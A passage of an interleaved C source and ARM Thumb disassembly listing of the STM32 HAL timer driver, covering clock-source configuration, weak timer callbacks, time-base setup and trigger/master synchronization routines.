      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 8005286:	687b      	ldr	r3, [r7, #4]
 8005288:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 800528a:	683b      	ldr	r3, [r7, #0]
 800528c:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 800528e:	683b      	ldr	r3, [r7, #0]
 8005290:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 8005292:	461a      	mov	r2, r3
 8005294:	f000 f8ce 	bl	8005434 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005298:	687b      	ldr	r3, [r7, #4]
 800529a:	681b      	ldr	r3, [r3, #0]
 800529c:	2150      	movs	r1, #80	; 0x50
 800529e:	4618      	mov	r0, r3
 80052a0:	f000 f927 	bl	80054f2 <TIM_ITRx_SetConfig>
      break;
 80052a4:	e02c      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 80052a6:	687b      	ldr	r3, [r7, #4]
 80052a8:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80052aa:	683b      	ldr	r3, [r7, #0]
 80052ac:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80052ae:	683b      	ldr	r3, [r7, #0]
 80052b0:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 80052b2:	461a      	mov	r2, r3
 80052b4:	f000 f8ed 	bl	8005492 <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 80052b8:	687b      	ldr	r3, [r7, #4]
 80052ba:	681b      	ldr	r3, [r3, #0]
 80052bc:	2160      	movs	r1, #96	; 0x60
 80052be:	4618      	mov	r0, r3
 80052c0:	f000 f917 	bl	80054f2 <TIM_ITRx_SetConfig>
      break;
 80052c4:	e01c      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80052c6:	687b      	ldr	r3, [r7, #4]
 80052c8:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80052ca:	683b      	ldr	r3, [r7, #0]
 80052cc:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80052ce:	683b      	ldr	r3, [r7, #0]
 80052d0:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 80052d2:	461a      	mov	r2, r3
 80052d4:	f000 f8ae 	bl	8005434 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 80052d8:	687b      	ldr	r3, [r7, #4]
 80052da:	681b      	ldr	r3, [r3, #0]
 80052dc:	2140      	movs	r1, #64	; 0x40
 80052de:	4618      	mov	r0, r3
 80052e0:	f000 f907 	bl	80054f2 <TIM_ITRx_SetConfig>
      break;
 80052e4:	e00c      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 80052e6:	687b      	ldr	r3, [r7, #4]
 80052e8:	681a      	ldr	r2, [r3, #0]
 80052ea:	683b      	ldr	r3, [r7, #0]
 80052ec:	681b      	ldr	r3, [r3, #0]
 80052ee:	4619      	mov	r1, r3
 80052f0:	4610      	mov	r0, r2
 80052f2:	f000 f8fe 	bl	80054f2 <TIM_ITRx_SetConfig>
      break;
 80052f6:	e003      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 80052f8:	2301      	movs	r3, #1
 80052fa:	73fb      	strb	r3, [r7, #15]
      break;
 80052fc:	e000      	b.n	8005300 <HAL_TIM_ConfigClockSource+0x178>
      break;
 80052fe:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005300:	687b      	ldr	r3, [r7, #4]
 8005302:	2201      	movs	r2, #1
 8005304:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005308:	687b      	ldr	r3, [r7, #4]
 800530a:	2200      	movs	r2, #0
 800530c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005310:	7bfb      	ldrb	r3, [r7, #15]
}
 8005312:	4618      	mov	r0, r3
 8005314:	3710      	adds	r7, #16
 8005316:	46bd      	mov	sp, r7
 8005318:	bd80      	pop	{r7, pc}

0800531a <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 800531a:	b480      	push	{r7}
 800531c:	b083      	sub	sp, #12
 800531e:	af00      	add	r7, sp, #0
 8005320:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 8005322:	bf00      	nop
 8005324:	370c      	adds	r7, #12
 8005326:	46bd      	mov	sp, r7
 8005328:	f85d 7b04 	ldr.w	r7, [sp], #4
 800532c:	4770      	bx	lr

0800532e <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 800532e:	b480      	push	{r7}
 8005330:	b083      	sub	sp, #12
 8005332:	af00      	add	r7, sp, #0
 8005334:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 8005336:	bf00      	nop
 8005338:	370c      	adds	r7, #12
 800533a:	46bd      	mov	sp, r7
 800533c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005340:	4770      	bx	lr

08005342 <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 8005342:	b480      	push	{r7}
 8005344:	b083      	sub	sp, #12
 8005346:	af00      	add	r7, sp, #0
 8005348:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 800534a:	bf00      	nop
 800534c:	370c      	adds	r7, #12
 800534e:	46bd      	mov	sp, r7
 8005350:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005354:	4770      	bx	lr

08005356 <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 8005356:	b480      	push	{r7}
 8005358:	b083      	sub	sp, #12
 800535a:	af00      	add	r7, sp, #0
 800535c:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 800535e:	bf00      	nop
 8005360:	370c      	adds	r7, #12
 8005362:	46bd      	mov	sp, r7
 8005364:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005368:	4770      	bx	lr
	...

0800536c <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 800536c:	b480      	push	{r7}
 800536e:	b085      	sub	sp, #20
 8005370:	af00      	add	r7, sp, #0
 8005372:	6078      	str	r0, [r7, #4]
 8005374:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 8005376:	687b      	ldr	r3, [r7, #4]
 8005378:	681b      	ldr	r3, [r3, #0]
 800537a:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 800537c:	687b      	ldr	r3, [r7, #4]
 800537e:	4a2a      	ldr	r2, [pc, #168]	; (8005428 <TIM_Base_SetConfig+0xbc>)
 8005380:	4293      	cmp	r3, r2
 8005382:	d003      	beq.n	800538c <TIM_Base_SetConfig+0x20>
 8005384:	687b      	ldr	r3, [r7, #4]
 8005386:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 800538a:	d108      	bne.n	800539e <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 800538c:	68fb      	ldr	r3, [r7, #12]
 800538e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005392:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 8005394:	683b      	ldr	r3, [r7, #0]
 8005396:	685b      	ldr	r3, [r3, #4]
 8005398:	68fa      	ldr	r2, [r7, #12]
 800539a:	4313      	orrs	r3, r2
 800539c:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 800539e:	687b      	ldr	r3, [r7, #4]
 80053a0:	4a21      	ldr	r2, [pc, #132]	; (8005428 <TIM_Base_SetConfig+0xbc>)
 80053a2:	4293      	cmp	r3, r2
 80053a4:	d00b      	beq.n	80053be <TIM_Base_SetConfig+0x52>
 80053a6:	687b      	ldr	r3, [r7, #4]
 80053a8:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80053ac:	d007      	beq.n	80053be <TIM_Base_SetConfig+0x52>
 80053ae:	687b      	ldr	r3, [r7, #4]
 80053b0:	4a1e      	ldr	r2, [pc, #120]	; (800542c <TIM_Base_SetConfig+0xc0>)
 80053b2:	4293      	cmp	r3, r2
 80053b4:	d003      	beq.n	80053be <TIM_Base_SetConfig+0x52>
 80053b6:	687b      	ldr	r3, [r7, #4]
 80053b8:	4a1d      	ldr	r2, [pc, #116]	; (8005430 <TIM_Base_SetConfig+0xc4>)
 80053ba:	4293      	cmp	r3, r2
 80053bc:	d108      	bne.n	80053d0 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 80053be:	68fb      	ldr	r3, [r7, #12]
 80053c0:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80053c4:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 80053c6:	683b      	ldr	r3, [r7, #0]
 80053c8:	68db      	ldr	r3, [r3, #12]
 80053ca:	68fa      	ldr	r2, [r7, #12]
 80053cc:	4313      	orrs	r3, r2
 80053ce:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 80053d0:	68fb      	ldr	r3, [r7, #12]
 80053d2:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 80053d6:	683b      	ldr	r3, [r7, #0]
 80053d8:	695b      	ldr	r3, [r3, #20]
 80053da:	4313      	orrs	r3, r2
 80053dc:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 80053de:	687b      	ldr	r3, [r7, #4]
 80053e0:	68fa      	ldr	r2, [r7, #12]
 80053e2:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 80053e4:	683b      	ldr	r3, [r7, #0]
 80053e6:	689a      	ldr	r2, [r3, #8]
 80053e8:	687b      	ldr	r3, [r7, #4]
 80053ea:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 80053ec:	683b      	ldr	r3, [r7, #0]
 80053ee:	681a      	ldr	r2, [r3, #0]
 80053f0:	687b      	ldr	r3, [r7, #4]
 80053f2:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 80053f4:	687b      	ldr	r3, [r7, #4]
 80053f6:	4a0c      	ldr	r2, [pc, #48]	; (8005428 <TIM_Base_SetConfig+0xbc>)
 80053f8:	4293      	cmp	r3, r2
 80053fa:	d007      	beq.n	800540c <TIM_Base_SetConfig+0xa0>
 80053fc:	687b      	ldr	r3, [r7, #4]
 80053fe:	4a0b      	ldr	r2, [pc, #44]	; (800542c <TIM_Base_SetConfig+0xc0>)
 8005400:	4293      	cmp	r3, r2
 8005402:	d003      	beq.n	800540c <TIM_Base_SetConfig+0xa0>
 8005404:	687b      	ldr	r3, [r7, #4]
 8005406:	4a0a      	ldr	r2, [pc, #40]	; (8005430 <TIM_Base_SetConfig+0xc4>)
 8005408:	4293      	cmp	r3, r2
 800540a:	d103      	bne.n	8005414 <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 800540c:	683b      	ldr	r3, [r7, #0]
 800540e:	691a      	ldr	r2, [r3, #16]
 8005410:	687b      	ldr	r3, [r7, #4]
 8005412:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 8005414:	687b      	ldr	r3, [r7, #4]
 8005416:	2201      	movs	r2, #1
 8005418:	615a      	str	r2, [r3, #20]
}
 800541a:	bf00      	nop
 800541c:	3714      	adds	r7, #20
 800541e:	46bd      	mov	sp, r7
 8005420:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005424:	4770      	bx	lr
 8005426:	bf00      	nop
 8005428:	40012c00 	.word	0x40012c00
 800542c:	40014000 	.word	0x40014000
 8005430:	40014400 	.word	0x40014400

08005434 <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005434:	b480      	push	{r7}
 8005436:	b087      	sub	sp, #28
 8005438:	af00      	add	r7, sp, #0
 800543a:	60f8      	str	r0, [r7, #12]
 800543c:	60b9      	str	r1, [r7, #8]
 800543e:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 8005440:	68fb      	ldr	r3, [r7, #12]
 8005442:	6a1b      	ldr	r3, [r3, #32]
 8005444:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 8005446:	68fb      	ldr	r3, [r7, #12]
 8005448:	6a1b      	ldr	r3, [r3, #32]
 800544a:	f023 0201 	bic.w	r2, r3, #1
 800544e:	68fb      	ldr	r3, [r7, #12]
 8005450:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005452:	68fb      	ldr	r3, [r7, #12]
 8005454:	699b      	ldr	r3, [r3, #24]
 8005456:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 8005458:	693b      	ldr	r3, [r7, #16]
 800545a:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 800545e:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 8005460:	687b      	ldr	r3, [r7, #4]
 8005462:	011b      	lsls	r3, r3, #4
 8005464:	693a      	ldr	r2, [r7, #16]
 8005466:	4313      	orrs	r3, r2
 8005468:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 800546a:	697b      	ldr	r3, [r7, #20]
 800546c:	f023 030a 	bic.w	r3, r3, #10
 8005470:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 8005472:	697a      	ldr	r2, [r7, #20]
 8005474:	68bb      	ldr	r3, [r7, #8]
 8005476:	4313      	orrs	r3, r2
 8005478:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 800547a:	68fb      	ldr	r3, [r7, #12]
 800547c:	693a      	ldr	r2, [r7, #16]
 800547e:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005480:	68fb      	ldr	r3, [r7, #12]
 8005482:	697a      	ldr	r2, [r7, #20]
 8005484:	621a      	str	r2, [r3, #32]
}
 8005486:	bf00      	nop
 8005488:	371c      	adds	r7, #28
 800548a:	46bd      	mov	sp, r7
 800548c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005490:	4770      	bx	lr

08005492 <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005492:	b480      	push	{r7}
 8005494:	b087      	sub	sp, #28
 8005496:	af00      	add	r7, sp, #0
 8005498:	60f8      	str	r0, [r7, #12]
 800549a:	60b9      	str	r1, [r7, #8]
 800549c:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 800549e:	68fb      	ldr	r3, [r7, #12]
 80054a0:	6a1b      	ldr	r3, [r3, #32]
 80054a2:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 80054a4:	68fb      	ldr	r3, [r7, #12]
 80054a6:	6a1b      	ldr	r3, [r3, #32]
 80054a8:	f023 0210 	bic.w	r2, r3, #16
 80054ac:	68fb      	ldr	r3, [r7, #12]
 80054ae:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80054b0:	68fb      	ldr	r3, [r7, #12]
 80054b2:	699b      	ldr	r3, [r3, #24]
 80054b4:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 80054b6:	693b      	ldr	r3, [r7, #16]
 80054b8:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 80054bc:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 80054be:	687b      	ldr	r3, [r7, #4]
 80054c0:	031b      	lsls	r3, r3, #12
 80054c2:	693a      	ldr	r2, [r7, #16]
 80054c4:	4313      	orrs	r3, r2
 80054c6:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 80054c8:	697b      	ldr	r3, [r7, #20]
 80054ca:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 80054ce:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 80054d0:	68bb      	ldr	r3, [r7, #8]
 80054d2:	011b      	lsls	r3, r3, #4
 80054d4:	697a      	ldr	r2, [r7, #20]
 80054d6:	4313      	orrs	r3, r2
 80054d8:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 80054da:	68fb      	ldr	r3, [r7, #12]
 80054dc:	693a      	ldr	r2, [r7, #16]
 80054de:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80054e0:	68fb      	ldr	r3, [r7, #12]
 80054e2:	697a      	ldr	r2, [r7, #20]
 80054e4:	621a      	str	r2, [r3, #32]
}
 80054e6:	bf00      	nop
 80054e8:	371c      	adds	r7, #28
 80054ea:	46bd      	mov	sp, r7
 80054ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054f0:	4770      	bx	lr

080054f2 <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 80054f2:	b480      	push	{r7}
 80054f4:	b085      	sub	sp, #20
 80054f6:	af00      	add	r7, sp, #0
 80054f8:	6078      	str	r0, [r7, #4]
 80054fa:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 80054fc:	687b      	ldr	r3, [r7, #4]
 80054fe:	689b      	ldr	r3, [r3, #8]
 8005500:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 8005502:	68fb      	ldr	r3, [r7, #12]
 8005504:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005508:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 800550a:	683a      	ldr	r2, [r7, #0]
 800550c:	68fb      	ldr	r3, [r7, #12]
 800550e:	4313      	orrs	r3, r2
 8005510:	f043 0307 	orr.w	r3, r3, #7
 8005514:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005516:	687b      	ldr	r3, [r7, #4]
 8005518:	68fa      	ldr	r2, [r7, #12]
 800551a:	609a      	str	r2, [r3, #8]
}
 800551c:	bf00      	nop
 800551e:	3714      	adds	r7, #20
 8005520:	46bd      	mov	sp, r7
 8005522:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005526:	4770      	bx	lr

08005528 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 8005528:	b480      	push	{r7}
 800552a:	b087      	sub	sp, #28
 800552c:	af00      	add	r7, sp, #0
 800552e:	60f8      	str	r0, [r7, #12]
 8005530:	60b9      	str	r1, [r7, #8]
 8005532:	607a      	str	r2, [r7, #4]
 8005534:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 8005536:	68fb      	ldr	r3, [r7, #12]
 8005538:	689b      	ldr	r3, [r3, #8]
 800553a:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 800553c:	697b      	ldr	r3, [r7, #20]
 800553e:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8005542:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 8005544:	683b      	ldr	r3, [r7, #0]
 8005546:	021a      	lsls	r2, r3, #8
 8005548:	687b      	ldr	r3, [r7, #4]
 800554a:	431a      	orrs	r2, r3
 800554c:	68bb      	ldr	r3, [r7, #8]
 800554e:	4313      	orrs	r3, r2
 8005550:	697a      	ldr	r2, [r7, #20]
 8005552:	4313      	orrs	r3, r2
 8005554:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005556:	68fb      	ldr	r3, [r7, #12]
 8005558:	697a      	ldr	r2, [r7, #20]
 800555a:	609a      	str	r2, [r3, #8]
}
 800555c:	bf00      	nop
 800555e:	371c      	adds	r7, #28
 8005560:	46bd      	mov	sp, r7
 8005562:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005566:	4770      	bx	lr

08005568 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 8005568:	b480      	push	{r7}
 800556a:	b085      	sub	sp, #20
 800556c:	af00      	add	r7, sp, #0
 800556e:	6078      	str	r0, [r7, #4]
 8005570:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 8005572:	687b      	ldr	r3, [r7, #4]
 8005574:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005578:	2b01      	cmp	r3, #1
 800557a:	d101      	bne.n	8005580 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 800557c:	2302      	movs	r3, #2
 800557e:	e04f      	b.n	8005620 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 8005580:	687b      	ldr	r3, [r7, #4]
 8005582:	2201      	movs	r2, #1
 8005584:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005588:	687b      	ldr	r3, [r7, #4]
 800558a:	2202      	movs	r2, #2
 800558c:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005590:	687b      	ldr	r3, [r7, #4]
 8005592:	681b      	ldr	r3, [r3, #0]
 8005594:	685b      	ldr	r3, [r3, #4]
 8005596:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005598:	687b      	ldr	r3, [r7, #4]
 800559a:	681b      	ldr	r3, [r3, #0]
 800559c:	689b      	ldr	r3, [r3, #8]
 800559e:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 80055a0:	687b      	ldr	r3, [r7, #4]
 80055a2:	681b      	ldr	r3, [r3, #0]
 80055a4:	4a21      	ldr	r2, [pc, #132]	; (800562c <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80055a6:	4293      	cmp	r3, r2
 80055a8:	d108      	bne.n	80055bc <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 80055aa:	68fb      	ldr	r3, [r7, #12]
 80055ac:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 80055b0:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 80055b2:	683b      	ldr	r3, [r7, #0]
 80055b4:	685b      	ldr	r3, [r3, #4]
 80055b6:	68fa      	ldr	r2, [r7, #12]
 80055b8:	4313      	orrs	r3, r2
 80055ba:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 80055bc:	68fb      	ldr	r3, [r7, #12]
 80055be:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80055c2:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 80055c4:	683b      	ldr	r3, [r7, #0]
 80055c6:	681b      	ldr	r3, [r3, #0]
 80055c8:	68fa      	ldr	r2, [r7, #12]
 80055ca:	4313      	orrs	r3, r2
 80055cc:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 80055ce:	687b      	ldr	r3, [r7, #4]
 80055d0:	681b      	ldr	r3, [r3, #0]
 80055d2:	68fa      	ldr	r2, [r7, #12]
 80055d4:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 80055d6:	687b      	ldr	r3, [r7, #4]
 80055d8:	681b      	ldr	r3, [r3, #0]
 80055da:	4a14      	ldr	r2, [pc, #80]	; (800562c <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 80055dc:	4293      	cmp	r3, r2
 80055de:	d009      	beq.n	80055f4 <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 80055e0:	687b      	ldr	r3, [r7, #4]
 80055e2:	681b      	ldr	r3, [r3, #0]
 80055e4:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
